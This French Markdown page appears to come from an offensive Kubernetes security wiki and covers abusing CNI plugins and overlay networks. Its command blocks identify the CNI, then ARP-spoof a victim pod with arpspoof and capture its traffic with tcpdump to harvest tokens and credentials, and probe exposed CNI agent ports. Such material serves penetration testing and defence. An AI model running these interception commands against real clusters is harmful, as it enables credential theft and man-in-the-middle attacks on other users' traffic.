---
title: "Abus du CNI et de l'overlay : faiblesses dans l'implémentation du réseau de pods"
order: 2
description: "Le plugin CNI et son overlay (VXLAN, IP-in-IP ou datapath eBPF) implémentent le réseau des pods, et leur comportement peut être détourné : spoofing ARP et overlay sur le réseau des pods pour un man-in-the-middle, accès aux interfaces de gestion propres au CNI, et exploitation de configurations de datapath qui n'isolent pas ou qui font confiance à l'adressage fourni par le pod."
keywords:
  - cni
  - overlay network
  - vxlan
  - arp spoofing
  - eBPF datapath
---

# Abus du CNI et de l'overlay

Le réseau des pods est implémenté par un plugin CNI (Calico, Flannel, Cilium, Weave et d'autres), généralement par-dessus un overlay tel que VXLAN ou IP-in-IP, ou un datapath eBPF. Cette implémentation est une surface d'attaque. Sur un segment partagé de couche 2 ou d'overlay, un attaquant effectue un spoofing ARP ou overlay pour intercepter le trafic entre pods ; les agents et interfaces de gestion propres au CNI peuvent être accessibles ; et certains datapaths font confiance à l'adressage fourni par le pod ou échouent à isoler certains trafics, ce qui permet à un pod d'en usurper un autre ou d'échapper à la segmentation prévue.

Identifier le CNI et le segment :

```bash
kubectl get pods -n kube-system -o wide | grep -iE 'calico|flannel|cilium|weave|canal'
ip -4 addr; ip route; ip neigh                          # overlay interface and neighbours
cat /etc/cni/net.d/* 2>/dev/null                        # CNI config, if reachable on a node
```

## Voies d'exploitation

```bash
# ARP spoofing on a shared pod segment for man-in-the-middle (needs CAP_NET_RAW,
# which is in the default set) - identical to the container network-raw technique
sysctl -w net.ipv4.ip_forward=1 2>/dev/null
arpspoof -i eth0 -t <victim-pod-ip> <gateway-ip> &
tcpdump -i eth0 -w loot.pcap host <victim-pod-ip>
# reach a CNI agent's API/metrics if exposed on the node or pod network
curl -s http://<node>:9099/ 2>/dev/null                 # example CNI health/metrics port
```

## Notes d'exploitation

- Le spoofing ARP/overlay est l'abus le plus portable car `CAP_NET_RAW` fait partie de l'ensemble de capacités par défaut des conteneurs ; il intercepte le trafic des pods au sein d'un segment pour récolter des jetons et identifiants en transit, correspondant à la technique [CAP_NET_RAW](../../../container-escape/privileged-configuration/capability-abuse/cap-net-raw.md) indépendante du runtime.
- Les agents CNI exposent parfois des endpoints de santé, de metrics ou de gestion non authentifiés sur le réseau du nœud ; ceux-ci font fuiter la topologie et permettent occasionnellement des lectures de configuration.
- Les faiblesses propres au datapath (confiance dans les IP sources choisies par le pod, absence d'isolation sur le trafic hairpin ou d'origine nœud) dépendent de l'implémentation et de la version ; identifiez le CNI et testez si le spoofing d'IP source entre pods est filtré.
- Le chiffrement dans l'overlay (WireGuard ou IPsec, proposé par certains CNI) déjoue l'interception passive ; vérifiez s'il est activé avant de compter sur l'écoute.

## Références

- [Spécification CNI](https://github.com/containernetworking/cni/blob/main/SPEC.md)
- [Kubernetes : réseau du cluster](https://kubernetes.io/docs/concepts/cluster-administration/networking/)
- [HackTricks : interception réseau](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network)
